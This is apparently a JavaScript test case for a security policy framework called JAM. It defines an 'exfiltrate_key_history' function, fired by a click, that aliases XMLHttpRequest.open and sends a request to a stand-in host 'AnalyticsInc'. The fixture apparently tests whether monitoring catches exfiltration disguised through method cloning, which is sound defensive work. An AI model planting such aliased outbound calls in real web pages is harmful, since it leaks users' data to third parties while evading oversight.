
JAM.startProfile('load');
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v0 = xmlhttp;
  introspect(JAM.policy.p1) {
    var v2 = xmlhttp.open
  }
  var v3 = JAM.call(v2.bind, v2, [xmlhttp]);
  v0.opennew = v3;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true]);
  xmlhttp.send(null);
  return;
}
var v1 = document.getElementById("test");
JAM.set(v1, "onclick", exfiltrate_key_history)

JAM.stopProfile('load');
